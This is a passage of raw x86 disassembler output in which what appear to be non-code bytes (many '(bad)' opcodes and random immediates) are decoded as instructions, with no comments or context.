  41c190:	ja     0x41c1a3
  41c192:	icebp  
  41c193:	in     al,dx
  41c194:	in     eax,0x39
  41c196:	lahf   
  41c197:	push   ss
  41c198:	leave  
  41c199:	sahf   
  41c19a:	jns    0x41c15d
  41c19c:	xlat   BYTE PTR ds:[ebx]
  41c19d:	xor    ch,BYTE PTR [eax]
  41c19f:	fsub   DWORD PTR [eax-0x71]
  41c1a2:	test   BYTE PTR [ebx+0x5b],0xd4
  41c1a6:	iret   
  41c1a7:	mov    bl,0x27
  41c1a9:	int    0x1f
  41c1ab:	lea    ebp,fs:[ecx+0x0]
  41c1af:	out    0x35,eax
  41c1b1:	cmc    
  41c1b2:	xchg   ecx,eax
  41c1b3:	xor    eax,0x9584dc3a
  41c1b8:	(bad)  
  41c1b9:	mov    ch,0x9a
  41c1bb:	into   
  41c1bc:	sub    eax,DWORD PTR [eax-0x6a3886e4]
  41c1c2:	adc    BYTE PTR [ebx-0x60],dl
  41c1c5:	dec    ebp
  41c1c6:	lds    ebp,FWORD PTR [esi]
  41c1c8:	push   ds
  41c1c9:	cmp    eax,ebx
  41c1cb:	mov    al,ds:0xc359d65e
  41c1d0:	arpl   WORD PTR [edi+ebp*8+0x7e647c7b],bp
  41c1d7:	sbb    DWORD PTR [ebp+0x6b9fba08],0xac33207
  41c1e1:	lods   eax,DWORD PTR ds:[esi]
  41c1e2:	loop   0x41c239
  41c1e4:	(bad)  
  41c1e7:	mov    bh,0x4a
  41c1e9:	adc    eax,0x965247f
  41c1ee:	cdq    
  41c1ef:	ret    
  41c1f0:	arpl   bx,si
  41c1f2:	clc    
  41c1f3:	cmp    al,0x9b
  41c1f5:	add    al,0xcc
  41c1f7:	stos   DWORD PTR es:[edi],eax
  41c1f8:	dec    edi
  41c1f9:	mov    es,esp
  41c1fb:	cli    
  41c1fc:	dec    edi
  41c1fd:	mov    ds:0x8f858136,al
  41c202:	out    dx,al
  41c203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c204:	and    eax,0x15b6afbe
  41c209:	adc    BYTE PTR [esi-0x702100d1],ah
  41c20f:	cli    
  41c210:	(bad)  [ebx]
  41c212:	shl    DWORD PTR [esi],1
  41c214:	jno    0x41c205
  41c216:	sbb    ebp,DWORD PTR [eax]
  41c218:	clc    
  41c219:	aam    0x99
  41c21b:	pop    esi
  41c21c:	rol    BYTE PTR [edx-0x699a3ab3],cl
  41c222:	add    eax,0x63684f00
  41c227:	aas    
  41c228:	dec    edi
  41c229:	push   esp
  41c22a:	sub    bl,BYTE PTR [ebp-0x1f]
  41c22d:	scas   al,BYTE PTR es:[edi]
  41c22e:	call   0x571c65ae
  41c233:	and    esp,DWORD PTR [ecx]
  41c235:	cmp    ecx,DWORD PTR [eax]
  41c237:	xor    ah,BYTE PTR [esi+0x1b106b60]
  41c23d:	loopne 0x41c24e
  41c23f:	xor    BYTE PTR [edi],dh
  41c241:	push   ecx
  41c242:	dec    esp
  41c243:	adc    al,0x3e
  41c245:	jae    0x41c22c
  41c247:	pop    ecx
  41c248:	inc    eax
  41c249:	ficom  WORD PTR [ebx-0xd4ee019]
  41c24f:	dec    edi
  41c250:	fldenv [ebx]
  41c252:	fisub  WORD PTR [ecx+0x402eb93b]
  41c258:	in     al,dx
  41c259:	in     eax,dx
  41c25a:	aaa    
  41c25b:	mov    ecx,0xfe0d957e
  41c260:	push   ebx
  41c261:	imul   esi,DWORD PTR [ecx-0x2b],0xff0aa81
  41c268:	(bad)  
  41c269:	fild   DWORD PTR [ebp-0x26]
  41c26c:	mov    dh,0x1
  41c26e:	je     0x41c2a9
  41c270:	xchg   edx,eax
  41c271:	mov    BYTE PTR [eax+0x4b42f22f],dl
  41c277:	mov    ecx,edi
  41c279:	jb     0x41c253
  41c27b:	pushf  
  41c27c:	fsub   DWORD PTR [ebp+esi*4-0x48]
  41c280:	inc    esi
  41c281:	inc    eax
  41c282:	(bad)  
  41c283:	inc    edx
  41c284:	(bad)  
  41c285:	inc    ebp
  41c287:	pop    eax
  41c288:	dec    esi
  41c289:	repz sub DWORD PTR [edx],edi
  41c28c:	and    ebx,DWORD PTR [ecx+0x5af9e6fa]
  41c292:	xchg   esi,eax
  41c293:	jb     0x41c2d1
  41c295:	ins    BYTE PTR es:[edi],dx
  41c296:	push   ss
  41c297:	test   al,0x61
  41c299:	cmc    
  41c29a:	sbb    DWORD PTR [esi+ecx*1],esi
  41c29d:	push   esi
  41c29e:	dec    eax
  41c29f:	xchg   edi,eax
  41c2a0:	cwde   
  41c2a1:	fdivr  QWORD PTR [ecx-0x7cbfba32]
  41c2a7:	repz (bad) 
  41c2a9:	iret   
  41c2aa:	xchg   edx,eax
  41c2ab:	sub    edx,DWORD PTR [eax+0x18]
  41c2ae:	push   0xeb054937
  41c2b3:	inc    ebp
  41c2b4:	jle    0x41c334
  41c2b6:	mov    ebx,0x53def934
  41c2bb:	xlat   BYTE PTR ds:[ebx]
  41c2bd:	inc    esi
  41c2be:	jmp    0x3e71:0x9477f35b
  41c2c5:	ret    
  41c2c6:	das    
  41c2c7:	and    ebp,DWORD PTR [ebp-0x7f961e87]
  41c2cd:	push   edi
  41c2ce:	mov    esi,ds
  41c2d0:	pop    ss
  41c2d1:	pop    edi
  41c2d2:	pop    ebx
  41c2d3:	ror    BYTE PTR [edi+0x4ae740e2],1
  41c2d9:	(bad)  
  41c2da:	ss mov dh,0xf1
  41c2dd:	jbe    0x41c2e5
  41c2df:	aam    0x99
  41c2e1:	adc    ah,cl
  41c2e3:	inc    ebx
  41c2e4:	mov    eax,ds:0x7deaf74c
  41c2e9:	cmp    edi,DWORD PTR [ebx+0x56a46edb]
  41c2ef:	mov    edi,0x3b0e0327
  41c2f4:	imul   DWORD PTR [esi-0x79f7c09b]
  41c2fa:	stos   BYTE PTR es:[edi],al
  41c2fb:	popa   
  41c2fc:	in     eax,0x84
  41c2fe:	std    
  41c2ff:	ror    DWORD PTR [ebx+eiz*2],cl
  41c302:	cmp    al,0xba
  41c304:	fs push es
  41c306:	xchg   esp,eax
  41c307:	es mov dl,0x9
  41c30a:	xor    al,0x40
  41c30c:	aas    
  41c30d:	and    ebx,DWORD PTR [esi+0x6]
  41c310:	in     al,0xed
  41c312:	aad    0xb1
  41c314:	(bad)  
  41c316:	mov    eax,ds:0x20987588
  41c31b:	cwde   
  41c31c:	mov    ah,0x46
  41c31e:	scas   al,BYTE PTR es:[edi]
  41c31f:	test   DWORD PTR [ebx+0x4b9b5c67],0x97a4018a
  41c329:	shl    BYTE PTR [eax+0x75],1
  41c32c:	jmp    0xf43b:0xc5561820
  41c333:	(bad)
  41c336:	xor    ah,BYTE PTR [edx-0x6e7cb3ae]
  41c33c:	jbe    0x41c30d
  41c33e:	sar    DWORD PTR [ecx-0x30e4b029],0x21
  41c345:	add    esi,edi
  41c347:	push   esp
  41c348:	push   0x73
  41c34a:	mov    esp,0xd9e0bd5a
  41c34f:	or     esi,esp
  41c351:	into   
  41c352:	mov    ch,BYTE PTR [eax+0x3e08bba5]
  41c358:	sub    DWORD PTR [edx+esi*1],edx
  41c35b:	test   eax,0xeed20f0b
  41c360:	fndisi(8087 only) 
  41c362:	mov    esi,0xb15132c2
  41c367:	mov    DWORD PTR [eax],0x9ccc41bf
  41c36d:	sbb    dh,BYTE PTR [esi-0x558d32b6]
  41c373:	neg    DWORD PTR [ebp-0x59]
  41c376:	cli    
  41c377:	dec    esp
  41c378:	push   edx
  41c379:	nop
  41c37a:	std    
  41c37b:	aaa    
  41c37c:	(bad)  
  41c37d:	sbb    edx,esi
  41c37f:	hlt    
  41c380:	adc    DWORD PTR [esi-0x4dca94a],edi
  41c386:	pop    ds
  41c387:	push   ebx
  41c388:	(bad)  
  41c389:	popf   
  41c38a:	or     al,BYTE PTR [edi-0x5ad86514]
  41c390:	outs   dx,BYTE PTR ds:[esi]
  41c391:	loope  0x41c40e
  41c393:	dec    edx
  41c394:	xor    cl,ch
  41c396:	mov    WORD PTR [si-0x56],cs
  41c39a:	pusha  
  41c39b:	retf   
  41c39c:	das    
  41c39d:	sub    eax,0x55502953
  41c3a2:	mov    eax,0x4dcf7b17
  41c3a7:	lods   eax,DWORD PTR ds:[esi]
  41c3a8:	cld    
  41c3a9:	and    DWORD PTR [ecx],edi
  41c3ab:	cmp    eax,0x4379c073
  41c3b0:	scas   al,BYTE PTR es:[edi]
  41c3b1:	fcomp  QWORD PTR [edx+eax*1+0x7b]
  41c3b5:	cmp    cl,BYTE PTR [eax]
  41c3b7:	leave  
  41c3b8:	push   eax
  41c3b9:	test   al,bh
  41c3bb:	mov    eax,0x125e8b31
  41c3c0:	dec    ebx
  41c3c1:	sti    
  41c3c2:	scas   al,BYTE PTR es:[edi]
  41c3c3:	mov    ebx,0x43aa203
  41c3c8:	loop   0x41c3a9
  41c3ca:	jl     0x41c3e0
  41c3cc:	fcomp  QWORD PTR [edi]
  41c3ce:	mov    DWORD PTR [ebx],esi
  41c3d0:	test   BYTE PTR [edx],ah
  41c3d2:	retf   0x50ef
  41c3d5:	or     ah,BYTE PTR [eax+0x6d08d6bc]
  41c3db:	inc    edi
  41c3dc:	adc    BYTE PTR [ebx-0x4c288a4c],bl
  41c3e2:	push   ss
  41c3e3:	scas   al,BYTE PTR es:[edi]
  41c3e4:	cmp    BYTE PTR [esi],al
  41c3e6:	loope  0x41c417
  41c3e8:	dec    ebp
  41c3e9:	xor    al,0xb3
  41c3eb:	add    dl,BYTE PTR [edi+0x21]
  41c3ee:	out    0x4d,al
  41c3f0:	add    BYTE PTR [edx-0xb],ah
  41c3f3:	push   ecx
  41c3f4:	loopne 0x41c396
  41c3f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3f7:	cmp    eax,0x5f8cd1ca
  41c3fc:	dec    eax
  41c3fd:	and    DWORD PTR [esi-0x61],esi
  41c400:	add    bh,bl
  41c402:	je     0x41c482
  41c404:	js     0x41c472
  41c406:	mov    ecx,0x5d03595a
  41c40b:	cdq    
  41c40c:	lock or al,0x25
  41c40f:	push   0xc504702d
  41c414:	es cmovno edi,edi
  41c418:	lods   al,BYTE PTR ds:[esi]
  41c419:	pop    ebp
  41c41a:	mov    esi,0x78736680
  41c41f:	bound  esp,QWORD PTR [ebx-0x70]
  41c422:	xor    dl,BYTE PTR [eax+0x57]
  41c425:	jp     0x41c470
  41c427:	sbb    ecx,DWORD PTR [edx]
  41c429:	push   cs
  41c42a:	jbe    0x41c49e
  41c42c:	jnp    0x41c420
  41c42e:	jne    0x41c41f
  41c430:	test   BYTE PTR [ebx],bh
  41c432:	pusha  
  41c433:	out    dx,eax
  41c434:	add    eax,0x69e3bf23
  41c439:	leave  
  41c43a:	sub    eax,0xc69ba3c9
  41c43f:	repz dec ebp
  41c441:	mov    esp,0xff357a91
  41c446:	retf   
  41c447:	jle    0x41c469
  41c449:	aad    0xaa
  41c44b:	sbb    DWORD PTR [ebx],ebp
  41c44d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c44e:	jl     0x41c432
  41c450:	lea    ebp,[edi+0x7d4e8b02]
  41c456:	int    0xd9
  41c458:	je     0x41c4aa
  41c45a:	or     eax,0x640b097d
  41c45f:	stc    
  41c460:	imul   esp,DWORD PTR [edx],0x8d65d83a
  41c466:	int    0x6f
  41c468:	and    bl,BYTE PTR [edx-0x58]
  41c46b:	enter  0x1186,0x43
  41c46f:	xor    DWORD PTR cs:[ebx-0x14],ebp
  41c473:	cmc    
  41c474:	lds    esp,FWORD PTR [eax+eiz*8]
  41c477:	stos   BYTE PTR es:[edi],al
  41c478:	std    
  41c479:	div    DWORD PTR [esi*8-0x7a0e2c7c]
  41c480:	shr    ebx,0xf1
  41c483:	(bad)  
  41c484:	xor    al,0xfe
  41c486:	cmp    DWORD PTR [esi+0x1468e92b],edi
  41c48c:	out    dx,al
  41c48d:	cmp    DWORD PTR [esi+edx*4+0x579c0f82],esi
  41c494:	xchg   ecx,esp
  41c496:	popa   
  41c497:	jno    0x41c4ec
  41c499:	inc    esi
  41c49a:	jecxz  0x41c50a
  41c49c:	scas   eax,DWORD PTR es:[edi]
  41c49d:	adc    al,0x85
  41c49f:	inc    eax
  41c4a0:	mov    ecx,0xcd30e1e9
  41c4a5:	push   eax
  41c4a6:	aas    
  41c4a7:	lods   eax,DWORD PTR ds:[esi]
  41c4a8:	lods   al,BYTE PTR ds:[esi]
  41c4a9:	test   al,0xd0
  41c4ab:	dec    esi
  41c4ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4ad:	jg     0x41c4fa
  41c4af:	rcl    DWORD PTR [edx],0x40
  41c4b2:	cdq    
  41c4b3:	pop    es
  41c4b4:	int3   
  41c4b5:	mov    dh,0xce
  41c4b7:	dec    ecx
  41c4b8:	stos   DWORD PTR es:[edi],eax
  41c4b9:	mov    dl,BYTE PTR [esi+ebp*1+0x17]
  41c4bd:	jg     0x41c475
  41c4bf:	dec    eax
  41c4c0:	push   edi
  41c4c1:	aaa    
  41c4c2:	outs   dx,DWORD PTR ds:[esi]
  41c4c3:	pop    ss
  41c4c4:	or     DWORD PTR [ebx+0x18],eax
  41c4c7:	jmp    0x41c489
  41c4c9:	cld    
  41c4ca:	cmp    BYTE PTR ds:[eax],cl
  41c4cd:	pop    edi
  41c4ce:	adc    dl,ah
  41c4d0:	sbb    eax,0xa15a17a6
  41c4d5:	lods   al,BYTE PTR ds:[esi]
  41c4d6:	lahf   
  41c4d7:	sbb    ch,BYTE PTR [ecx-0x35a76f53]
  41c4dd:	retf   
  41c4de:	clc    
  41c4df:	sub    esi,DWORD PTR [ecx]
  41c4e1:	or     eax,DWORD PTR [ecx]
  41c4e3:	push   cs
  41c4e4:	fisub  WORD PTR [edx]
  41c4e6:	jne    0x41c54c
  41c4e8:	cwde   
  41c4e9:	push   ds
  41c4ea:	fcomp  QWORD PTR [ecx]
  41c4ec:	rcl    BYTE PTR [esp+eiz*2-0x7a],1
  41c4f0:	ret    0xc7ec
  41c4f3:	xchg   ebp,eax
  41c4f4:	(bad)  
  41c4f5:	cmp    dh,0xc1
  41c4f8:	mov    al,ds:0xb3e05da5
  41c4fd:	mov    edx,DWORD PTR [ebx-0x289cb54d]
  41c503:	mov    dh,0xd9
  41c505:	dec    ebp
  41c506:	pop    edi
  41c507:	loopne 0x41c4ba
  41c509:	fstp   DWORD PTR [ebx]
  41c50b:	inc    edi
  41c50c:	int    0x84
  41c50e:	gs mov edx,0xac017756
  41c514:	add    bh,BYTE PTR [edx-0x6b]
  41c517:	and    ah,BYTE PTR [ebp+0x47]
  41c51a:	rcr    DWORD PTR [eax],0xc4
  41c51d:	xchg   esi,eax
  41c51e:	into   
  41c51f:	fs jg  0x41c577
  41c522:	cmc    
  41c523:	out    dx,al
  41c524:	push   ecx
  41c525:	jae    0x41c563
  41c527:	addr16 push esi
  41c529:	inc    edi
  41c52a:	lea    ebx,[ebx+0x7a]
  41c52d:	mov    BYTE PTR ss:0xd34866c3,dl
  41c534:	push   ds
  41c535:	push   esi
  41c536:	jmp    0xa317:0x46b98149
  41c53d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c53e:	sbb    BYTE PTR [ecx],bh
  41c540:	sub    eax,0x275cf6b9
  41c545:	stc    
  41c546:	cmp    BYTE PTR [ebx+0x11ee2b58],al
  41c54c:	cmp    ch,BYTE PTR [edx-0xbeda366]
  41c552:	(bad)  
  41c553:	jno    0x41c583
  41c555:	pop    ecx
  41c556:	xchg   esi,ebp
  41c558:	mov    al,ds:0x6928701c
  41c55d:	arpl   WORD PTR [ebx],bx
  41c55f:	xor    BYTE PTR [edi+eiz*2+0x61f132d],dl
  41c566:	cmp    eax,0x68fbbd4a
  41c56b:	test   al,0x64
  41c56d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c56e:	lds    eax,FWORD PTR [edx-0x37f11a84]
  41c574:	daa    
  41c575:	loopne 0x41c5c0
  41c577:	mov    WORD PTR [eax+0xb3f08dc],gs
  41c57d:	push   eax
  41c57e:	ja     0x41c566
  41c580:	aaa    
  41c581:	mov    eax,ds:0x1eb45500
  41c586:	mov    bh,0xaf
  41c588:	xor    BYTE PTR [eax-0x6c1a93a4],ah
  41c58e:	imul   edi,DWORD PTR [ecx+ebx*1],0x2d
  41c592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c593:	pop    edx
  41c594:	loope  0x41c588
  41c596:	add    al,0xd8
  41c598:	dec    ebx
  41c599:	ins    DWORD PTR es:[edi],dx
  41c59a:	cs mov edi,0xbdcca6c6
  41c5a0:	sahf   
  41c5a1:	push   ds
  41c5a2:	add    eax,0x46bc139
  41c5a7:	fld    TBYTE PTR [ecx]
  41c5a9:	jb     0x41c570
  41c5ab:	retf   
  41c5ac:	fimul  DWORD PTR [esi]
  41c5ae:	xor    esp,DWORD PTR [edi-0x5]
  41c5b1:	mov    bh,0xd6
  41c5b3:	xchg   edi,eax
  41c5b4:	push   cs
  41c5b5:	push   esi
  41c5b6:	push   ebx
  41c5b7:	xor    DWORD PTR [ecx-0x25ee1a79],ecx
  41c5bd:	jne    0x41c605
  41c5bf:	mov    ds,WORD PTR [ecx-0x6a]
  41c5c2:	add    eax,0xa5a99505
  41c5c7:	(bad)  
  41c5c8:	lods   eax,DWORD PTR ds:[esi]
  41c5c9:	loope  0x41c55e
  41c5cb:	inc    ecx
  41c5cc:	add    bh,dl
  41c5ce:	rcl    DWORD PTR [esi+0x55],0xc
  41c5d2:	and    esi,ebp
  41c5d4:	gs push ebp
  41c5d6:	icebp  
  41c5d7:	sub    eax,0x8c0c30f9
  41c5dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5dd:	jns    0x41c569
  41c5df:	outs   dx,BYTE PTR ds:[esi]
  41c5e0:	pop    eax
  41c5e1:	xchg   DWORD PTR [esi+0xe],ebx
  41c5e4:	inc    eax
  41c5e5:	es pop esp
  41c5e7:	out    0xc2,eax
  41c5e9:	cs xchg edx,eax
  41c5eb:	sub    bh,BYTE PTR [edi-0x25]
  41c5ee:	retf   
  41c5ef:	xor    eax,0x8451f7d9
  41c5f4:	clc    
  41c5f5:	dec    esi
  41c5f6:	mov    ecx,0x7ad49d02
  41c5fb:	lahf   
  41c5fc:	pop    ebx
  41c5fd:	inc    esi
  41c5fe:	icebp  
  41c5ff:	add    al,0x9f
  41c601:	xor    eax,0xf38a3b75
  41c606:	in     eax,dx
  41c607:	test   BYTE PTR [ebp-0x14528ad0],dh
  41c60d:	inc    edx
  41c60e:	je     0x41c5a3
  41c610:	mov    dh,0xda
  41c612:	gs dec eax
  41c614:	cdq    
  41c615:	push   edx
  41c616:	pop    ss
  41c617:	xor    bl,ah
  41c619:	popa   
  41c61a:	(bad)  
  41c61b:	leave  
  41c61c:	add    eax,0x24e1b0ab
  41c621:	mov    ebx,0xdd624b7b
  41c626:	mov    esi,0xa20f089d
  41c62b:	dec    esi
  41c62c:	add    eax,0x7996f2e1
  41c631:	adc    BYTE PTR [ebx+0x34],ah
  41c634:	jbe    0x41c5fd
  41c636:	imul   esp,DWORD PTR ds:0x9fac6c63,0xe1a1ec5e
  41c640:	mov    ecx,DWORD PTR [ebx-0x77]
  41c643:	sub    al,BYTE PTR [esi-0x72]
  41c646:	mov    bl,0x2a
  41c648:	scas   eax,DWORD PTR es:[edi]
  41c649:	jge    0x41c69c
  41c64b:	or     BYTE PTR [ecx+0x4247af06],bh
  41c651:	pop    ecx
  41c652:	dec    eax
  41c653:	sub    eax,0x759048ad
  41c658:	fsubr  DWORD PTR [ecx+0x46a2058f]
  41c65e:	jbe    0x41c6c3
  41c660:	dec    eax
  41c661:	repz out 0x81,eax
  41c664:	lahf   
  41c665:	cmc    
  41c666:	retf   
  41c667:	push   ebx
  41c668:	inc    ebx
  41c669:	int3   
  41c66a:	push   cs
  41c66b:	or     edx,eax
  41c66d:	push   es
  41c66e:	xor    eax,0xdc7bcae4
  41c673:	outs   dx,DWORD PTR ds:[esi]
  41c674:	push   eax
  41c675:	inc    eax
  41c676:	loopne 0x41c63a
  41c678:	loope  0x41c6b1
  41c67a:	push   ss
  41c67b:	jns    0x41c6f5
  41c67d:	mov    bl,0xa0
  41c67f:	mov    ds:0xff5ee470,eax
  41c684:	jle    0x41c6d9
  41c686:	xchg   esp,esi
  41c688:	mov    ds:0xd679d61e,al
  41c68d:	icebp  
  41c68e:	jmp    0x41c6de
  41c690:	xor    BYTE PTR [edi+0x7d],dh
  41c693:	popf   
  41c694:	inc    eax
  41c695:	jns    0x41c681
  41c697:	or     DWORD PTR [ecx+0x17],ecx
  41c69a:	pusha  
  41c69b:	fsub   st,st(7)
  41c69d:	mov    ch,0xf5
  41c69f:	xchg   ecx,eax
  41c6a0:	imul   ebp,DWORD PTR [ecx-0x51b03fa7],0xffffffbe
  41c6a7:	xchg   ah,ah
  41c6a9:	mov    ch,cl
  41c6ab:	pop    eax
  41c6ac:	adc    dh,BYTE PTR [edx+0x50e7a995]
  41c6b2:	sbb    eax,0xba662417
  41c6b7:	sub    edx,edi
  41c6b9:	adc    eax,0x4fb9c6de
  41c6be:	sahf   
  41c6bf:	dec    esp
  41c6c0:	(bad)  
  41c6c1:	es dec edx
  41c6c3:	jecxz  0x41c686
  41c6c5:	in     al,dx
  41c6c6:	fisttp DWORD PTR [ebp-0x292ae0fc]
  41c6cc:	jle    0x41c681
  41c6ce:	in     al,0x60
  41c6d0:	pop    edx
  41c6d1:	sbb    al,0xa2
  41c6d3:	push   edi
  41c6d4:	mov    esi,0x194782b3
  41c6d9:	loop   0x41c6f4
  41c6db:	xor    BYTE PTR [ebx],cl
  41c6dd:	sub    eax,0x3d4345c0
  41c6e2:	jno    0x41c6d3
  41c6e4:	cmp    DWORD PTR [esi+0x248420b2],ebx
  41c6ea:	jb     0x41c689
  41c6ec:	jnp    0x41c6c1
  41c6ee:	loop   0x41c6ba
  41c6f0:	jnp    0x41c69c
  41c6f2:	(bad)  
  41c6f3:	add    eax,0x6e21a2ee
  41c6f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6f9:	mul    BYTE PTR [edi+0x6b3591fe]
  41c6ff:	repz into 
  41c701:	xor    al,0xbd
  41c703:	add    ah,dh
  41c705:	mov    ds,WORD PTR [ecx+ebx*8+0x5ff12e3b]
  41c70c:	xor    ah,BYTE PTR es:[ebp-0x7549c852]
  41c713:	mov    eax,0x8ee91486
  41c718:	ss jg  0x41c73d
  41c71b:	inc    edi
  41c71c:	or     eax,esp
  41c71e:	in     eax,0xb8
  41c720:	adc    DWORD PTR cs:[edi-0x43],ecx
  41c724:	stos   BYTE PTR es:[edi],al
  41c725:	mov    ah,0x5b
  41c727:	push   cs
  41c728:	add    BYTE PTR [ecx+0x35be6f32],bl
  41c72e:	out    0x6,eax
  41c730:	les    esi,FWORD PTR [ecx-0x69]
  41c733:	xor    DWORD PTR ds:0xefc438b7,0x17421ee9
  41c73d:	inc    ecx
  41c73e:	xor    al,0x6e
  41c740:	nop
  41c741:	mov    ebp,0xedcc0cf0
  41c746:	je     0x41c77b
  41c748:	cmp    DWORD PTR [edx],ebx
  41c74a:	bound  edx,QWORD PTR [esi+0xa]
  41c74d:	jnp    0x41c6dc
  41c74f:	push   esp
  41c750:	sbb    edx,eax
  41c752:	jne    0x41c70e
  41c754:	pop    ss
  41c755:	adc    BYTE PTR [ecx],ah
  41c757:	add    eax,0x38f8d674
  41c75c:	mov    bh,0xcd
  41c75e:	mov    eax,ds:0x7d61cfe7
  41c763:	cmp    DWORD PTR [edi+edx*8-0x4e084b76],esp
  41c76a:	inc    ebx
  41c76b:	mov    ebx,cr0
  41c76e:	pusha  
  41c76f:	outs   dx,DWORD PTR ds:[esi]
  41c770:	pop    ds
  41c771:	and    cl,BYTE PTR [edx]
  41c773:	jnp    0x41c7db
  41c775:	and    BYTE PTR [esi-0x7d8fdb4c],cl
  41c77b:	enter  0xaf1,0x68
  41c77f:	js     0x41c7ea
  41c781:	fistp  WORD PTR [ecx-0xd]
  41c784:	push   0xffffffa4
  41c786:	(bad)  [ebx]
  41c788:	ins    BYTE PTR es:[edi],dx
  41c789:	fisub  WORD PTR [edi+0x3373f14]
  41c78f:	imul   DWORD PTR [ebx]
  41c791:	inc    ebp
  41c792:	pop    bx
  41c794:	push   edx
  41c795:	mov    edx,0x6d71ebc3
  41c79a:	aaa    
  41c79b:	fisubr DWORD PTR [ebx+0x73d9c937]
  41c7a1:	mov    ds:0x78f52d0c,eax
  41c7a6:	sub    bh,BYTE PTR ds:0x8edcee37
  41c7ac:	cmc    
  41c7ad:	in     al,dx
  41c7ae:	push   0xffffffc6
  41c7b0:	(bad)  
  41c7b1:	icebp  
  41c7b2:	daa    
  41c7b3:	mov    ds:0xa9cf9081,eax
  41c7b8:	(bad)  
  41c7b9:	mov    eax,ds:0x4108befc
  41c7be:	xchg   esi,eax
  41c7bf:	adc    al,0x4
  41c7c1:	repz pop edx
  41c7c3:	hlt    
  41c7c4:	mov    edi,0x8ba051c0
  41c7c9:	in     eax,dx
  41c7ca:	mov    al,0x70
  41c7cc:	mov    ebp,0xe6fffb57
  41c7d1:	sar    DWORD PTR [edi+0x218326db],cl
  41c7d7:	popf   
  41c7d8:	not    DWORD PTR [edx+0x23df6768]
  41c7de:	inc    esi
  41c7df:	js     0x41c844
  41c7e1:	test   eax,0xa465469e
  41c7e6:	ds jb  0x41c813
  41c7e9:	fstp   DWORD PTR [ebx-0x79]
  41c7ec:	xor    edx,DWORD PTR [esi]
  41c7ee:	retf   
  41c7ef:	shl    DWORD PTR [edx-0x16e95962],cl
  41c7f5:	js     0x41c844
  41c7f7:	jle    0x41c7fd
  41c7f9:	and    al,0x59
  41c7fb:	jo     0x41c874
  41c7fd:	sub    ebp,DWORD PTR [eax+0x29]
  41c800:	sbb    ebp,0xb799875f
  41c806:	(bad)  
  41c807:	jmp    0xb336:0x8b7fd510
  41c80e:	loop   0x41c7ee
  41c810:	sub    BYTE PTR [ebx],bh
  41c812:	sbb    ch,BYTE PTR ss:[ecx-0x3d]
  41c816:	and    BYTE PTR [eax],bh
  41c818:	mov    dl,0xb
  41c81a:	ret    
  41c81b:	inc    ebp
  41c81c:	and    eax,0xa131b69d
  41c821:	test   BYTE PTR [ebx],0x86
  41c824:	xchg   BYTE PTR [edx+0x43bf650d],dh
  41c82a:	jmp    0xcb6e:0x1a5d3750
  41c831:	gs xchg esp,eax
  41c833:	jns    0x41c81b
  41c835:	popa   
  41c836:	call   0xf373b914
  41c83b:	into   
  41c83c:	mov    bh,0x80
  41c83e:	es mov bl,0xf6
  41c841:	xor    DWORD PTR [eax-0x5a899155],0xc3fb0af2
  41c84b:	add    al,0xe2
  41c84d:	dec    edi
  41c84e:	aad    0x84
  41c850:	xor    eax,DWORD PTR [eax-0x1ecf6f82]
  41c856:	cld    
  41c857:	add    al,0x37
  41c859:	aam    0xc0
  41c85b:	les    ebp,FWORD PTR [ecx]
  41c85d:	cdq    
  41c85e:	rcr    DWORD PTR [esi+0x7a862859],1
  41c864:	push   edi
  41c865:	aad    0x8e
  41c867:	xchg   ebx,eax
  41c868:	mov    esi,0xbc9cbc5f
  41c86d:	mov    bh,0xb
  41c86f:	(bad)  
  41c870:	out    dx,al
  41c871:	popa   
  41c872:	(bad)  
  41c873:	hlt    
  41c874:	or     DWORD PTR [esp+ecx*1-0x3c],0x91cc06ff
  41c87c:	in     eax,dx
  41c87d:	inc    eax
  41c87e:	push   eax
  41c87f:	jno    0x41c86d
  41c881:	mov    ch,BYTE PTR [esi]
  41c883:	imul   edx,DWORD PTR [ecx-0x57],0x282eef92
  41c88a:	adc    al,0x4e
  41c88c:	and    dl,BYTE PTR [esi+ebx*2-0x4e]
  41c890:	iret   
  41c891:	xchg   ebx,eax
  41c892:	jmp    0x5141:0x8763a19a
  41c899:	xor    al,0x25
  41c89b:	jge    0x41c8a6
  41c89d:	mov    dh,0x82
  41c89f:	mov    ebp,0x64d53144
  41c8a4:	ficom  DWORD PTR [edx]
  41c8a6:	cpuid  
  41c8a8:	lods   eax,DWORD PTR ds:[esi]
  41c8a9:	mov    cl,0xa0
  41c8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8ac:	push   cs
  41c8ad:	jg     0x41c8c9
  41c8af:	dec    esp
  41c8b0:	aas    
  41c8b1:	adc    al,0x45
  41c8b3:	fbld   TBYTE PTR [ecx-0x6]
  41c8b6:	(bad)  
  41c8b7:	rcr    eax,1
  41c8b9:	inc    ebx
  41c8ba:	pusha  
  41c8bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8bc:	adc    al,0x48
  41c8be:	test   BYTE PTR [ecx-0x46],dl
  41c8c1:	inc    eax
  41c8c2:	mov    ah,0x4
  41c8c4:	mov    cl,0x19
  41c8c6:	jl     0x41c8e2
  41c8c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8c9:	adc    ch,BYTE PTR [esi-0x5a65b9ac]
  41c8cf:	cmp    eax,0x5d327d9b
  41c8d4:	ror    BYTE PTR [ebp+0x20423cf8],1
  41c8da:	or     ebp,0x51668d71
  41c8e0:	ds pop esi
  41c8e2:	aad    0x6f
  41c8e4:	pop    ebp
  41c8e5:	mov    bh,BYTE PTR [ecx]
  41c8e7:	das    
  41c8e8:	ds xchg ebp,eax
  41c8ea:	jmp    0x67eb:0xd36941c6
  41c8f1:	and    ebx,ebx
  41c8f3:	cmp    esp,DWORD PTR [esi]
  41c8f5:	addr16 jo 0x41c943
  41c8f8:	push   0x5e
  41c8fa:	ja     0x41c8c2
  41c8fc:	inc    ebp
  41c8fd:	loope  0x41c957
  41c8ff:	loopne 0x41c913
